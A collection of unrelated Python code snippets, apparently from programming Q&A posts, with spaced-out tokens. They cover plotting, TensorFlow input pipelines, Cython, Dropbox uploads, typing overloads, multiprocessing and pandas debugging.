"from plotly.subplots import make_subplotsimport plotly.graph_objects as goimport numpy as npfig = make_subplots ( rows=2 , cols=2 , subplot_titles=list ( map ( str , range ( 4 ) ) ) , shared_xaxes=True , shared_yaxes=False , ) time = np.linspace ( -np.pi , np.pi , 1000 ) for i in range ( 4 ) : data = np.sin ( ( i+1 ) * time ) fig.add_trace ( go.Scatter ( y=data , x=time , name=str ( i ) ) , row=1 if i in [ 0 , 1 ] else 2 , col=1 if i in [ 0 , 2 ] else 2 , ) fig.add_shape ( go.layout.Shape ( type= '' line '' , yref= '' paper '' , xref= '' x '' , x0=1 , y0=0 , x1=1 , y1=1 , line=dict ( color= '' RoyalBlue '' , width=3 ) , ) , row=1 , col=1 ) fig.write_image ( `` 1.png '' , width=800 , height=600 , scale=1 ) for shape in fig.layout.shapes : shape [ `` yref '' ] = '' paper ''"
"pulse = np.load ( 'data/pulse.npy ' ) # 768 samplespulse_samples = len ( pulse ) pulse_samplerate = 960 # 960 Hzpulse_duration = pulse_samples / pulse_samplerate # here : 0.8 spulse_time = np.linspace ( 0 , pulse_duration , pulse_samples , endpoint=False ) carrier_freq = 40e6 # 40 MHzcarrier_samplerate = 100e6 # 100 MHzcarrier_samples = pulse_duration * carrier_samplerate # 80 milliont1 = np.linspace ( 0 , pulse_duration , carrier_samples ) # method used in scipy.signal.resample # https : //github.com/scipy/scipy/blob/v0.17.0/scipy/signal/signaltools.py # L1754t2 = np.arange ( 0 , carrier_samples ) * ( pulse_time [ 1 ] - pulse_time [ 0 ] ) \ * pulse_samples / float ( carrier_samples ) + pulse_time [ 0 ] omega_t1 = 2 * np.pi * carrier_frequency * t1np.cos ( omega_t1 ) # 3.2 secondsnp.sin ( omega_t1 ) # 3.3 secondsomega_t2 = 2 * np.pi * carrier_frequency * t2np.cos ( omega_t2 ) # 3.2 secondsnp.sin ( omega_t2 ) # 9 minutes"
"import tensorflow as tffrom tqdm import trangeimport sysimport globimport ossess = tf.Session ( ) tf.keras.backend.set_session ( sess ) num_classes = 257image_size = ( 224 , 224 , 3 ) # Build a tf.data.Dataset from TFRecords.tfrecord_directory = 'path/to/tfrecords/directory'tfrecord_filennames = glob.glob ( os.path.join ( tfrecord_directory , '*.tfrecord ' ) ) feature_schema = { 'image ' : tf.FixedLenFeature ( [ ] , tf.string ) , 'filename ' : tf.FixedLenFeature ( [ ] , tf.string ) , 'label ' : tf.FixedLenFeature ( [ ] , tf.int64 ) } dataset = tf.data.Dataset.from_tensor_slices ( tfrecord_filennames ) dataset = dataset.shuffle ( len ( tfrecord_filennames ) ) # Shuffle the TFRecord file names.dataset = dataset.flat_map ( lambda filename : tf.data.TFRecordDataset ( filename ) ) dataset = dataset.map ( lambda single_example_proto : tf.parse_single_example ( single_example_proto , feature_schema ) ) # Deserialize tf.Example objects.dataset = dataset.map ( lambda sample : ( sample [ 'image ' ] , sample [ 'label ' ] ) ) dataset = dataset.map ( lambda image , label : ( tf.image.decode_jpeg ( image , channels=3 ) , label ) ) # Decode JPEG images.dataset = dataset.map ( lambda image , label : ( tf.image.resize_image_with_pad ( image , target_height=image_size [ 0 ] , target_width=image_size [ 1 ] ) , label ) ) dataset = dataset.map ( lambda image , label : ( tf.image.per_image_standardization ( image ) , label ) ) dataset = dataset.map ( lambda image , label : ( image , tf.one_hot ( indices=label , depth=num_classes ) ) ) # Convert labels to one-hot format.dataset = dataset.shuffle ( buffer_size=10000 ) dataset = dataset.repeat ( ) dataset = dataset.batch ( 32 ) iterator = dataset.make_one_shot_iterator ( ) features , labels = iterator.get_next ( ) # Build a simple model.input_tensor = tf.keras.layers.Input ( shape=image_size ) x = tf.keras.layers.Conv2D ( 64 , ( 3,3 ) , strides= ( 2,2 ) , activation='relu ' , kernel_initializer='he_normal ' ) ( input_tensor ) x = tf.keras.layers.Conv2D ( 64 , ( 3,3 ) , strides= ( 2,2 ) , activation='relu ' , kernel_initializer='he_normal ' ) ( x ) x = tf.keras.layers.Conv2D ( 128 , ( 3,3 ) , strides= ( 2,2 ) , activation='relu ' , kernel_initializer='he_normal ' ) ( x ) x = tf.keras.layers.Conv2D ( 256 , ( 3,3 ) , strides= ( 2,2 ) , activation='relu ' , kernel_initializer='he_normal ' ) ( x ) x = tf.keras.layers.GlobalAveragePooling2D ( ) ( x ) x = tf.keras.layers.Dense ( num_classes , activation=None , kernel_initializer='he_normal ' ) ( x ) model = tf.keras.models.Model ( input_tensor , x ) # Build the training-relevant part of the graph.model_output = model ( features ) loss = tf.reduce_mean ( tf.nn.softmax_cross_entropy_with_logits_v2 ( labels=tf.stop_gradient ( labels ) , logits=model_output ) ) train_op = tf.train.AdamOptimizer ( ) .minimize ( loss ) # The next block is for the metrics.with tf.variable_scope ( 'metrics ' ) as scope : predictions_argmax = tf.argmax ( model_output , axis=-1 , output_type=tf.int64 ) labels_argmax = tf.argmax ( labels , axis=-1 , output_type=tf.int64 ) mean_loss_value , mean_loss_update_op = tf.metrics.mean ( loss ) acc_value , acc_update_op = tf.metrics.accuracy ( labels=labels_argmax , predictions=predictions_argmax ) local_metric_vars = tf.contrib.framework.get_variables ( scope=scope , collection=tf.GraphKeys.LOCAL_VARIABLES ) metrics_reset_op = tf.variables_initializer ( var_list=local_metric_vars ) # Run the trainingepochs = 3steps_per_epoch = 1000fetch_list = [ mean_loss_value , acc_value , train_op , mean_loss_update_op , acc_update_op ] sess.run ( tf.global_variables_initializer ( ) ) sess.run ( tf.local_variables_initializer ( ) ) with sess.as_default ( ) : for epoch in range ( 1 , epochs+1 ) : tr = trange ( steps_per_epoch , file=sys.stdout ) tr.set_description ( 'Epoch { } / { } '.format ( epoch , epochs ) ) sess.run ( metrics_reset_op ) for train_step in tr : ret = sess.run ( fetch_list , feed_dict= { tf.keras.backend.learning_phase ( ) : 1 } ) tr.set_postfix ( ordered_dict= { 'loss ' : ret [ 0 ] , 'accuracy ' : ret [ 1 ] } ) epochs = 3steps_per_epoch = 1000model.compile ( optimizer='adam ' , loss='categorical_crossentropy ' , metrics= [ 'accuracy ' ] ) history = model.fit ( dataset , epochs=epochs , steps_per_epoch=steps_per_epoch ) loss = tf.reduce_mean ( tf.nn.softmax_cross_entropy_with_logits_v2 ( labels=tf.stop_gradient ( labels ) , logits=model_output ) ) loss = tf.reduce_mean ( tf.keras.backend.categorical_crossentropy ( target=labels , output=model_output , from_logits=True ) )"
"def main ( ) try : dostuff except Exception as ex : import traceback tb = traceback.format_exc ( ) import platform node = platform.node ( ) sendMail ( [ DEBUG_EMAIL ] , `` Alarm exception on % s '' % node , str ( tb ) , [ ] ) Traceback ( most recent call last ) : File `` /usr/lib/python2.6/logging/__init__.py '' , line 799 , in emit stream.write ( fs % msg.encode ( `` UTF-8 '' ) ) UnicodeDecodeError : 'ascii ' codec ca n't decode byte 0xc3 in position 66 : ordinal not in range ( 128 ) sys.tracebacklimit = 10 try : ... doing stuff , something goes boom with encoding ... except UnicodeError : stream.write ( fs % msg.encode ( `` UTF-8 '' ) ) Here it goes Boom again self.flush ( ) except ( KeyboardInterrupt , SystemExit ) : raise except : self.handleError ( record ) Which means it ends up here ei = sys.exc_info ( ) try : traceback.print_exception ( ei [ 0 ] , ei [ 1 ] , ei [ 2 ] , None , sys.stderr )"
"- root - bin - .lib - config Alarm.o ... libopenzwave.a libopenzwave.so libopenzwave.so.1.4 ... - libopenzwave driver.pxd group.pxd ... - louie __init__.py dispatcher.py ... - openzwave __init__.py command.py ... six.py hello_world.py Traceback ( most recent call last ) : File `` hello_world.py '' , line 40 , in < module > from openzwave.controller import ZWaveController File `` /storage/.kodi/addons/service.multimedia.open-zwave/openzwave/controller.py '' , line 34 , in < module > from libopenzwave import PyStatDriver , PyControllerState ImportError : No module named libopenzwave Traceback ( most recent call last ) : File `` hello_world.py '' , line 40 , in < module > from openzwave.controller import ZWaveController File `` /storage/.kodi/addons/service.multimedia.open-zwave/openzwave/controller.py '' , line 34 , in < module > from libopenzwave import PyStatDriver , PyControllerState ImportError : dynamic module does not define init function ( initlibopenzwave )"
"// cpp_parser.h # ifndef _FUNC_H_ # define _FUNC_H_ # include < Python.h > # include < numpy/arrayobject.h > void parse_ndarray ( PyObject * ) ; # endif // cpp_parser.cpp # include `` cpp_parser.h '' # include < iostream > using namespace std ; void parse_ndarray ( PyObject *obj ) { if ( PyArray_Check ( obj ) ) { // this throws seg fault cout < < `` PyArray_Check Passed '' < < endl ; } else { cout < < `` PyArray_Check Failed '' < < endl ; } } # parser.pxdcdef extern from `` cpp_parser.h '' : cdef void parse_ndarray ( object ) # parser.pyximport numpy as npcimport numpy as npdef py_parse_array ( object x ) : assert isinstance ( x , np.ndarray ) parse_ndarray ( x ) # setup.pyfrom distutils.core import setup , Extensionfrom Cython.Build import cythonizeimport numpy as npext = Extension ( name='parser ' , sources= [ 'parser.pyx ' , 'cpp_parser.cpp ' ] , language= ' c++ ' , include_dirs= [ np.get_include ( ) ] , extra_compile_args= [ '-fPIC ' ] , ) setup ( name='parser ' , ext_modules=cythonize ( [ ext ] ) ) # run_test.pyimport numpy as npfrom parser import py_parse_arrayx = np.arange ( 10 ) py_parse_array ( x )"
> > > Folder = `` locales/ '' > > > Folder2 = `` locales/ '' > > > Folder is Folder2False > > > Folder == Folder2True > > > File = `` file '' > > > File2 = `` file '' > > > File is File2True > > > File == File2True > > >
"from slimit import minifyif __name__ == `` __main__ '' : print ( `` start '' ) # Normally , I pass real JavaScript . For this issue , an empty string reproduces problem . minify ( `` '' , mangle=True ) print ( `` exit '' ) startWARNING : Could n't write lextab module < module 'slimit.lextab ' from '/Users/kurtostfeld/samba/wrapad/venv/lib/python2.7/site-packages/slimit/lextab.pyc ' > . Wo n't overwrite existing lextab moduleWARNING : yacc table file version is out of dateWARNING : Token 'IMPORT ' defined , but not usedWARNING : Token 'BLOCK_COMMENT ' defined , but not usedWARNING : Token 'ENUM ' defined , but not usedWARNING : Token 'EXTENDS ' defined , but not usedWARNING : Token 'LINE_COMMENT ' defined , but not usedWARNING : Token 'LINE_TERMINATOR ' defined , but not usedWARNING : Token 'CONST ' defined , but not usedWARNING : Token 'EXPORT ' defined , but not usedWARNING : Token 'CLASS ' defined , but not usedWARNING : Token 'SUPER ' defined , but not usedWARNING : There are 10 unused tokensWARNING : Could n't create < module 'slimit.yacctab ' from '/Users/kurtostfeld/samba/wrapad/venv/lib/python2.7/site-packages/slimit/yacctab.pyc ' > . Wo n't overwrite existing tabmoduleexit"
"def MSE_metric ( y_true , y_pred ) : return K.mean ( K.square ( y_pred , y_true ) ) model.compile ( optimizer=SGD ( lr=0.01 , momntum=0.9 ) , loss='MSE ' , metrics= [ MSE_metric ] )"
"import dropboxclient = dropbox.client.DropboxClient ( ' < token > ' ) f = open ( '/ssd-scratch/abhishekb/try/1.mat ' , 'rb ' ) response = client.put_file ( '/data/1.mat ' , f ) import os , pdb , dropboxsize=1194304client = dropbox.client.DropboxClient ( token ) path= 'D : /bci_code/datasets/1.mat'tot_size = os.path.getsize ( path ) bigFile = open ( path , 'rb ' ) uploader = client.get_chunked_uploader ( bigFile , size ) print `` uploading : `` , tot_sizewhile uploader.offset < tot_size : try : upload = uploader.upload_chunked ( ) print uploader.offset except rest.ErrorResponse , e : print ( `` something went wrong '' ) size=1194304tot_size = os.path.getsize ( path ) bigFile = open ( path , 'rb ' ) uploader = client.get_chunked_uploader ( bigFile , tot_size ) print `` uploading : `` , tot_sizewhile uploader.offset < tot_size : try : upload = uploader.upload_chunked ( chunk_size=size ) print uploader.offset except rest.ErrorResponse , e : print ( `` something went wrong '' )"
edge_map = ( xy/ ( x_norm*y_norm ) ) edge_map [ np.isnan ( edge_map ) ] = 0
"import networkx as nximport matplotlib.pylab as pltT=nx.Graph ( ) T.add_edge ( 0,1 ) nx.draw ( T ) plt.show ( ) import networkx as nximport matplotlib.pylab as pltT=nx.Graph ( ) T.add_edge ( 0,1 ) labs= { } labs [ 0 ] ='cake'labs [ 1 ] ='cookie'nx.draw ( T , labels=labs ) plt.show ( ) matplotlib ( 1.4.0 ) ( had to downgrade the pyparsing to 1.5.7 after updating the matplotlib ) networkx ( 1.9 ) python 2.7.6Mac OS X 10.9.4 -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -TypeError Traceback ( most recent call last ) /usr/local/lib/python2.7/site-packages/matplotlib/artist.pyc in draw_wrapper ( artist , renderer , *args , **kwargs ) 57 def draw_wrapper ( artist , renderer , *args , **kwargs ) : 58 before ( artist , renderer ) -- - > 59 draw ( artist , renderer , *args , **kwargs ) 60 after ( artist , renderer ) 61 /usr/local/lib/python2.7/site-packages/matplotlib/figure.pyc in draw ( self , renderer ) 1077 dsu.sort ( key=itemgetter ( 0 ) ) 1078 for zorder , a , func , args in dsu : - > 1079 func ( *args ) 1080 1081 renderer.close_group ( 'figure ' ) /usr/local/lib/python2.7/site-packages/matplotlib/artist.pyc in draw_wrapper ( artist , renderer , *args , **kwargs ) 57 def draw_wrapper ( artist , renderer , *args , **kwargs ) : 58 before ( artist , renderer ) -- - > 59 draw ( artist , renderer , *args , **kwargs ) 60 after ( artist , renderer ) 61 /usr/local/lib/python2.7/site-packages/matplotlib/axes/_base.pyc in draw ( self , renderer , inframe ) 2090 2091 for zorder , a in dsu : - > 2092 a.draw ( renderer ) 2093 2094 renderer.close_group ( 'axes ' ) /usr/local/lib/python2.7/site-packages/matplotlib/artist.pyc in draw_wrapper ( artist , renderer , *args , **kwargs ) 57 def draw_wrapper ( artist , renderer , *args , **kwargs ) : 58 before ( artist , renderer ) -- - > 59 draw ( artist , renderer , *args , **kwargs ) 60 after ( artist , renderer ) 61 /usr/local/lib/python2.7/site-packages/matplotlib/text.pyc in draw ( self , renderer ) 536 renderer.open_group ( 'text ' , self.get_gid ( ) ) 537 -- > 538 bbox , info , descent = self._get_layout ( renderer ) 539 trans = self.get_transform ( ) 540 /usr/local/lib/python2.7/site-packages/matplotlib/text.pyc in _get_layout ( self , renderer ) 309 tmp , lp_h , lp_bl = renderer.get_text_width_height_descent ( 'lp ' , 310 self._fontproperties , -- > 311 ismath=False ) 312 offsety = ( lp_h - lp_bl ) * self._linespacing 313 /usr/local/lib/python2.7/site-packages/matplotlib/backends/backend_macosx.pyc in get_text_width_height_descent ( self , s , prop , ismath ) 164 size = self.points_to_pixels ( points ) 165 width , height , descent = self.gc.get_text_width_height_descent ( -- > 166 six.text_type ( s ) , family , size , weight , style ) 167 return width , height , 0.0*descent 168 TypeError : bad argument type for built-in operation"
"ld = [ { ' a ' : 1 } , { ' b ' : 2 , ' c ' : 3 } , { 'd ' : 4 , ' e ' : 5 } ] > > > max ( ld , key=len ) { ' b ' : 2 , ' c ' : 3 } > > > max ( enumerate ( ld ) , key=lambda tup : len ( tup [ 1 ] ) ) ( 1 , { ' b ' : 2 , ' c ' : 3 } ) ( 1 : { ' b ' : 2 , ' c ' : 3 } , 2 : { 'd ' : 4 , ' e ' : 5 } )"
"import threadingprint 'threading . 'def dock ( ) : try : from twisted.internet.protocol import Factory , Protocol from twisted.internet import reactor import currentTime print ' [ * ] Imports succesful . ' except : print ' [ / ] Imports failed . ' # Define the class for the protocol class Master ( Protocol ) : command = raw_input ( ' > ' ) def connectionMade ( self ) : print 'Slave connected . ' print currentTime.getTime ( ) # Print current time # self.transport.write ( `` Hello '' ) def connectionLost ( self , reason ) : print 'Lost . ' # Assemble it in a `` factory '' class MasterFactory ( Factory ) : protocol = Master reactor.listenTCP ( 8800 , MasterFactory ( ) ) # Run it all reactor.run ( ) def commandline ( ) : raw_input ( ' > ' ) threading.Thread ( target=dock ( ) ) .start ( ) threading.Thread ( target=commandline ( ) ) .start ( )"
"try : os.makedirs ( path ) except WindowsError : print `` Folder already exists , moving on . `` except Exception as e : print e error = 1 try : os.makedirs ( path ) except WindowsError as e : if `` directory already exists '' in e : print `` Folder already exists , moving on . '' else : raiseexcept Exception as e : print e error = 1"
- A [ n : m ] == B [ L-m : L-n ] - B [ n : m ] == A [ L-m : L-n ] - all other elements are in place A = 0 1 2 3 4 5 6 7 B = 0 5 6 3 4 1 2 7 A = 0 1 2 3 4 5 6 7B = 1 0 2 3 4 5 7 6 testing 0123456789 L= 10 test_alexis ok in 15.4252s test_evgeny_kluev_A ok in 30.3875s test_evgeny_kluev_B ok in 27.1382s test_evgeny_kluev_C ok in 14.8131s test_ian ok in 26.8318s test_jared_goguen ok in 10.0999s test_jason_herbburn ok in 21.3870s test_tom_karzes ok in 27.9769s
"@ inlineCallbacksdef logging ( data ) : ofile = open ( `` file '' , `` w '' ) ofile.write ( data ) yield os.system ( `` command to upload the written file '' ) @ APP.route ( '/dostuff ' ) @ inlineCallbacksdef dostuff ( ) : yield logging ( data ) print `` check ! '' returnValue ( `` 42 '' )"
"import cairofrom gi.repository import Pangofrom gi.repository import PangoCairosurf = cairo.ImageSurface ( cairo.FORMAT_ARGB32 , 8 , 8 ) ctx = cairo.Context ( surf ) pctx = PangoCairo.create_context ( ctx ) # Creates a PangoContextpctx.set_antialias ( cairo.ANTIALIAS_SUBPIXEL ) # This fails import cairoimport pangoimport pangocairosurf = cairo.ImageSurface ( cairo.FORMAT_ARGB32 , 8 , 8 ) ctx = cairo.Context ( surf ) pctx = pangocairo.CairoContext ( ctx ) pctx.set_antialias ( cairo.ANTIALIAS_SUBPIXEL )"
"def collatz ( number ) : global seqNum if ( seqNum % 2 == 0 ) : return seqNum // 2 elif ( seqNum % 2 == 1 ) : return 3 * seqNum + 1print ( 'What number would you like to use ? ' ) seqNum = input ( ) number = int ( seqNum ) i = numberwhile i > 1 : collatz ( seqNum ) print ( number ) `` Traceback ( most recent call last ) : File `` C : /Users/Administrative/AppData/Local/Programs/Python/Python36-32/collatzSeq.py '' , line 15 , in < module > collatz ( seqNum ) File `` C : /Users/Administrative/AppData/Local/Programs/Python/Python36-32/collatzSeq.py '' , line 3 , in collatz if ( seqNum % 2 == 0 ) : TypeError : not all arguments converted during string formatting ''"
"def makeBaby ( mommy , daddy ) : `` '' '' Execute the miracle of life . Args : mommy : description of mommy daddy : description of daddy `` '' '' def makeBaby ( mommy , daddy ) : `` '' '' Execute the miracle of life . : param mommy : description of mommy : param daddy : description of daddy `` '' ''"
2013K2 2013K3 2013K4 2013K5ABC1 ABC2 ABC3 ABC4324 5435 543 5436543 543 657 765765 876 876 9876 2013K2|ABC1 2013K3|ABC2 2013K4|ABC3 2013K5|ABC4324 5435 543 5436543 543 657 765765 876 876 9876
"import sysfrom multiprocessing import Poolfrom random import randomdef calculate_pi ( iters ) : `` '' '' Worker function `` '' '' points = 0 # points inside circle for i in iters : x = random ( ) y = random ( ) if x ** 2 + y ** 2 < = 1 : points += 1 return pointsif __name__ == `` __main__ '' : if len ( sys.argv ) ! = 3 : print `` Usage : python pi.py workers_number iterations_per_worker '' exit ( ) procs = int ( sys.argv [ 1 ] ) iters = float ( sys.argv [ 2 ] ) # 1E+8 is cool p = Pool ( processes=procs ) total = iters * procs total_in = 0 for points in p.map ( calculate_pi , [ xrange ( int ( iters ) ) ] * procs ) : total_in += points print `` Total : `` , total , `` In : `` , total_in print `` Pi : `` , 4.0 * total_in / total"
"def DfTos3Csv ( df , file ) : with fs.open ( file , 'wb ' ) as f : df.to_csv ( f , compression='gzip ' , index=False ) def s3CsvToDf ( file ) : with fs.open ( file ) as f : df = pd.read_csv ( f , compression='gzip ' ) return df"
id date1 date21 11/1/2016 11/1/20161 11/1/2016 11/2/20161 11/1/2016 11/1/20161 11/1/2016 11/2/20161 11/2/2016 11/2/20162 11/1/2016 11/1/20162 11/1/2016 11/2/20162 11/1/2016 11/1/20162 11/2/2016 11/2/20162 11/2/2016 11/2/2016 id samedate count1 11/1/2016 2 1 11/2/2016 1 2 11/1/2016 2 2 11/2/2016 2 gb=df.groupby ( id ' ) .apply ( lambda x : x [ x.date1== x.date2 ] [ 'date1 ' ] .size ( ) ) TypeError : 'int ' object is not callable
"regexps= [ ] regexps.append ( { r'left ' : ' % . * ' , 'right ' : r '' } ) # this strips all the comments , but messes up with the percent characters ( \ % ) regexps.append ( { r'left ' : ' [ ^\ ] % . * ' , 'right ' : r '' } ) # this is incorrect ( escapes the closing `` ] '' ) return applyRegexps ( latexText , regexps ) def applyRegexps ( text , listRegExp ) : `` '' '' Applies successively many regexps to a text '' '' '' if testMode : print str ( listRegExp ) # apply all the regexps in the list for element in listRegExp : left = element [ 'left ' ] right = element [ 'right ' ] r=re.compile ( left ) text=r.sub ( right , text ) return text"
"def persist_rect ( newlims ) : rs = toggle_selector.RS print ( rs.visible ) rs.set_visible ( True ) rs.update ( ) current_ax.callbacks.connect ( 'xlim_changed ' , persist_rect ) current_ax.callbacks.connect ( 'ylim_changed ' , persist_rect )"
"attr { key : `` T '' value { type : DT_FLOAT } } node = tf.NodeDef ( name='MyConstTensor ' , op='Const ' , attr= { 'value ' : tf.AttrValue ( tensor=tensor_proto ) , 'dtype ' : tf.AttrValue ( type=dt ) } ) node = tf.NodeDef ( ) node.name = 'MySub'node.op = 'Sub'node.input.extend ( [ 'MyConstTensor ' , 'conv2 ' ] ) node.attr [ `` key '' ] .s = 'T ' # TypeError : 'T ' has type str , but expected one of : bytes node.attr [ `` T '' ] .type = b'float32 '"
"from typing import Optional , List , overloadclass Foo : value : int def __init__ ( self , value : int ) - > None : self.value = value def __add__ ( self , other : 'Foo ' ) - > 'Optional [ Foo ] ' : result = self.value - other.value if result > 42 : return None else : return Foo ( result ) class Bar : value : str def __init__ ( self , value : str ) - > None : self.value = value def __add__ ( self , other : 'Bar ' ) - > 'Optional [ Bar ] ' : if len ( self.value ) + len ( other.value ) > 42 : return None else : return Bar ( self.value + other.value ) class Baz : value : List [ str ] def __init__ ( self , value : List [ str ] ) - > None : self.value = value def __add__ ( self , other : 'Bar ' ) - > 'Optional [ Baz ] ' : if len ( self.value ) + 1 > 42 : return None else : return Baz ( [ *self.value , other.value ] ) @ overloaddef Add ( this : Optional [ Foo ] , that : Optional [ Foo ] ) - > Optional [ Foo ] : ... @ overloaddef Add ( this : Optional [ Bar ] , that : Optional [ Bar ] ) - > Optional [ Bar ] : ... @ overloaddef Add ( this : Optional [ Baz ] , that : Optional [ Bar ] ) - > Optional [ Baz ] : ... def Add ( this , that ) : if this is None or that is None : return None else : return this + that mcve4.py:35 : error : Overloaded function signatures 1 and 2 overlap with incompatible return typesmcve4.py:35 : error : Overloaded function signatures 1 and 3 overlap with incompatible return typesmcve4.py:38 : error : Overloaded function signatures 2 and 3 overlap with incompatible return types from typing import List , overloadclass Foo : value : int def __init__ ( self , value : int ) - > None : self.value = value def __add__ ( self , other : 'Foo ' ) - > 'Foo ' : result = self.value - other.value return Foo ( result ) class Bar : value : str def __init__ ( self , value : str ) - > None : self.value = value def __add__ ( self , other : 'Bar ' ) - > 'Bar ' : return Bar ( self.value + other.value ) class Baz : value : List [ str ] def __init__ ( self , value : List [ str ] ) - > None : self.value = value def __add__ ( self , other : 'Bar ' ) - > 'Optional [ Baz ] ' : return Baz ( [ *self.value , other.value ] ) @ overloaddef Add ( this : Foo , that : Foo ) - > Foo : ... @ overloaddef Add ( this : Bar , that : Bar ) - > Bar : ... @ overloaddef Add ( this : Baz , that : Bar ) - > 'Optional [ Baz ] ' : ... def Add ( this , that ) : if this is None or that is None : return None else : return this + that @ overloaddef Add ( this : None , that : None ) - > None : ... @ overloaddef Add ( this : Optional [ Foo ] , that : Optional [ Foo ] ) - > Optional [ Foo ] : ... @ overloaddef Add ( this : Optional [ Bar ] , that : Optional [ Bar ] ) - > Optional [ Bar ] : ... @ overloaddef Add ( this : Optional [ Baz ] , that : Optional [ Bar ] ) - > Optional [ Baz ] : ... def Add ( this , that ) : if this is None or that is None : return None else : return this + that mcve4.py:37 : error : Overloaded function signatures 2 and 3 overlap with incompatible return typesmcve4.py:37 : error : Overloaded function signatures 2 and 4 overlap with incompatible return typesmcve4.py:40 : error : Overloaded function signatures 3 and 4 overlap with incompatible return types @ overloaddef Add ( this : None , that : None ) - > None : ... @ overloaddef Add ( this : Foo , that : Optional [ Foo ] ) - > Optional [ Foo ] : ... @ overloaddef Add ( this : Optional [ Foo ] , that : Foo ) - > Optional [ Foo ] : ... @ overloaddef Add ( this : Baz , that : Bar ) - > Optional [ Baz ] : ... @ overloaddef Add ( this : Baz , that : Optional [ Bar ] ) - > Optional [ Baz ] : ... @ overloaddef Add ( this : Optional [ Baz ] , that : Bar ) - > Optional [ Baz ] : # 6 ... @ overloaddef Add ( this : Bar , that : Optional [ Bar ] ) - > Optional [ Bar ] : ... @ overloaddef Add ( this : Optional [ Bar ] , that : Bar ) - > Optional [ Bar ] : # 8 ... def Add ( this , that ) : if this is None or that is None : return None else : return this + that mcve4.py:49 : error : Overloaded function signatures 6 and 8 overlap with incompatible return types"
"import multiprocessing , sys , timedef f ( icount , _sleepTime = 1 ) : for i in range ( icount ) : time.sleep ( _sleepTime ) print ( _sleepTime ) def main ( args ) : m = multiprocessing.Process ( target = f , args= ( 4 , ) ) m.run ( ) # f should be sleeping for 1 second so this print statement should come first print ( m.is_alive ( ) ) if __name__ == `` __main__ '' : sys.exit ( main ( sys.argv [ 1 : ] ) ) 1111False True1111 import multiprocessing , sys , timedef f ( icount , _sleepTime = 1 ) : for i in range ( icount ) : time.sleep ( _sleepTime ) print ( _sleepTime ) def main ( args ) : m = multiprocessing.Process ( target = f , args= ( 4 , ) ) for i in range ( 15 ) : time.sleep ( .5 ) if not m.is_alive ( ) : # m.start throws an error after first run m.run ( ) print ( `` { } '' .format ( m.is_alive ( ) ) ) if __name__ == `` __main__ '' : sys.exit ( main ( sys.argv [ 1 : ] ) )"
"import numpy as npimport pandas as pdind = [ 0 , 1 , 2 ] cols = [ ' A ' , ' B ' , ' C ' ] df = pd.DataFrame ( np.arange ( 9 ) .reshape ( ( 3,3 ) ) , columns=cols ) A B C 0 0 1 2 1 3 4 5 2 6 7 8 A 0 B 4 C 8 df.loc [ ind , cols ] A B C0 0 1 21 3 4 52 6 7 8"
"jon @ debian : ~/anaconda3/bin $ ipythonPython 3.5.1 |Continuum Analytics , Inc.| ( default , Dec 7 2015 , 11:17:45 ) Type `` copyright '' , `` credits '' or `` license '' for more information.IPython 4.1.2 -- An enhanced Interactive Python. ? - > Introduction and overview of IPython 's features. % quickref - > Quick reference.help - > Python 's own help system.object ? - > Details about 'object ' , use 'object ? ? ' for extra details.In [ 1 ] : import pygraphvizIn [ 2 ] : /home/jon/anaconda3/bin/python /home/jon/apps/pycharm-community-5.0.4/helpers/pydev/pydevconsole.py 59089 41751Python 3.5.1 |Anaconda 2.5.0 ( 32-bit ) | ( default , Dec 7 2015 , 11:17:45 ) Type `` copyright '' , `` credits '' or `` license '' for more information.IPython 4.0.3 -- An enhanced Interactive Python. ? - > Introduction and overview of IPython 's features. % quickref - > Quick reference.help - > Python 's own help system.object ? - > Details about 'object ' , use 'object ? ? ' for extra details.PyDev console : using IPython 4.0.3import sys ; print ( 'Python % s on % s ' % ( sys.version , sys.platform ) ) sys.path.extend ( [ '/home/jon/PycharmProjects/StateMachine ' ] ) Python 3.5.1 |Anaconda 2.5.0 ( 32-bit ) | ( default , Dec 7 2015 , 11:17:45 ) [ GCC 4.4.7 20120313 ( Red Hat 4.4.7-1 ) ] on linuxIn [ 2 ] : import pygraphvizTraceback ( most recent call last ) : File `` /home/jon/anaconda3/lib/python3.5/site-packages/IPython/core/interactiveshell.py '' , line 3066 , in run_code exec ( code_obj , self.user_global_ns , self.user_ns ) File `` < ipython-input-2-99ed911275c0 > '' , line 1 , in < module > import pygraphviz File `` /home/jon/apps/pycharm-community-5.0.4/helpers/pydev/pydev_import_hook.py '' , line 21 , in do_import module = self._system_import ( name , *args , **kwargs ) ImportError : No module named 'pygraphviz ' Python 3.5.1 |Continuum Analytics , Inc.| ( default , Dec 7 2015 , 11:17:45 ) Python 3.5.1 |Anaconda 2.5.0 ( 32-bit ) | ( default , Dec 7 2015 , 11:17:45 )"
"from concurrent.futures import ThreadPoolExecutordef spam ( url , hello=None , params=None ) : print ( url , hello , params ) urls = [ 1 , 2 , 3 , 4 , 5 ] params = [ ( 6 , 7 ) , 7 , ( ' a ' , 1 ) , 9 , 'ab ' ] with ThreadPoolExecutor ( 5 ) as executor : res = executor.map ( spam , urls , params ) 1 ( 6 , 7 ) None2 7 None3 ( ' a ' , 1 ) None4 9 None5 ab None"
From-node to-node
"> > > import numpy as np ; from sys import getsizeof > > > A = np.zeros ( ( 1024,1024,1024 ) , dtype=np.int16 ) > > > getsizeof ( A ) 2147483776 > > > for i in range ( 1024 ) : ... for j in range ( 1024 ) : ... for k in range ( 1024 ) : ... A [ i , j , k ] = np.random.randint ( 32767 , dtype = np.int16 )"
< td class='thisIsMyClass ' colspan=4 > < a id='123 ' class='thisIsMyOtherClass ' href='123 ' > Put me Elsewhere < /a > < font SIZE= '' 3 '' COLOR= '' # 333333 '' FACE= '' Verdana '' STYLE= '' background-color : # ffffff ; font-weight : bold ; '' > < h2 > Put Me Elsewhere < /h2 > < /font > import osfor filename in os.listdir ( 'dirname ' ) : replace ( filename ) def replace ( filename ) : tags = soup.find_all ( attrs= { `` thisIsMyClass '' } )
"C : \c\Sponge\SpongeDocs\source\plugin\scheduler.rst:25 : ERROR : Error in `` code-block '' directive:1 argument ( s ) required , 0 supplied ... code-block : : taskBuilder.execute ( new Runnable ( ) { public void run ( ) { logger.info ( `` Yay ! Schedulers ! `` ) ; } } ) ;"
"re.compile ( r '' [ a-z ] [ A-Z ] '' ) re.compile ( r '' [ a-z ] [ A-Z ] '' , re.UNICODE )"
"ax.add_patch ( Rectangle ( ( 25 , -1.4 ) , 3 , 1.3 , edgecolor='red ' , fill=False , linestyle='dashed ' ) )"
